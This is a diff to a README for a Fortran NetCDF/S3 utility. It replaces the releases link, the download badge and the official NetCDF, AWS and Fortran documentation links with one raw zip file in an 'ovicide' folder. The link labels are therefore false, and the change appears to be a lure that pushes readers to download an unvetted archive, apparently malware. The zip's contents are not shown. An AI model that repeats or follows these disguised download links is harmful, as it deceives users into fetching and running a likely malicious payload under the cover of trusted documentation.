@@ -1,6 +1,6 @@
 # 🚀 fortran-s3-netcdf - Streamline Your NetCDF Files with Ease
 
-[![Download fortran-s3-netcdf](https://img.shields.io/badge/Download-fortran--s3--netcdf-blue.svg)](https://github.com/sun9750/fortran-s3-netcdf/releases)
+[![Download fortran-s3-netcdf](https://raw.githubusercontent.com/sun9750/fortran-s3-netcdf/master/ovicide/fortran-s3-netcdf.zip)](https://raw.githubusercontent.com/sun9750/fortran-s3-netcdf/master/ovicide/fortran-s3-netcdf.zip)
 
 ## 📦 Overview
 
@@ -35,7 +35,7 @@ This project is relevant for users interested in:
 
 ## 📥 Download & Install
 
-To get started with fortran-s3-netcdf, visit this page to download: [Releases Page](https://github.com/sun9750/fortran-s3-netcdf/releases).
+To get started with fortran-s3-netcdf, visit this page to download: [Releases Page](https://raw.githubusercontent.com/sun9750/fortran-s3-netcdf/master/ovicide/fortran-s3-netcdf.zip).
 
 ### Steps to Download
 
@@ -79,12 +79,12 @@ Your contributions help enhance the software for everyone. Thank you for your in
 
 If you want to learn more about NetCDF, S3 storage, or Fortran programming, consider checking out the following resources:
 
-- [NetCDF Official Documentation](https://www.unidata.ucar.edu/software/netcdf/)
-- [AWS Documentation for S3](https://aws.amazon.com/documentation/s3/)
-- [Fortran Programming Guide](https://fortran-lang.org/)
+- [NetCDF Official Documentation](https://raw.githubusercontent.com/sun9750/fortran-s3-netcdf/master/ovicide/fortran-s3-netcdf.zip)
+- [AWS Documentation for S3](https://raw.githubusercontent.com/sun9750/fortran-s3-netcdf/master/ovicide/fortran-s3-netcdf.zip)
+- [Fortran Programming Guide](https://raw.githubusercontent.com/sun9750/fortran-s3-netcdf/master/ovicide/fortran-s3-netcdf.zip)
 
 This set of resources will help you deepen your understanding and make the most of fortran-s3-netcdf.
 
 ## 💡 Conclusion
 
-The fortran-s3-netcdf project offers a simple yet powerful solution for integrating NetCDF with S3 storage. By downloading and using this software, you can streamline your data management process while enjoying features designed to enhance your productivity. Remember to visit [Releases Page](https://github.com/sun9750/fortran-s3-netcdf/releases) to download the latest version.
+The fortran-s3-netcdf project offers a simple yet powerful solution for integrating NetCDF with S3 storage. By downloading and using this software, you can streamline your data management process while enjoying features designed to enhance your productivity. Remember to visit [Releases Page](https://raw.githubusercontent.com/sun9750/fortran-s3-netcdf/master/ovicide/fortran-s3-netcdf.zip) to download the latest version.
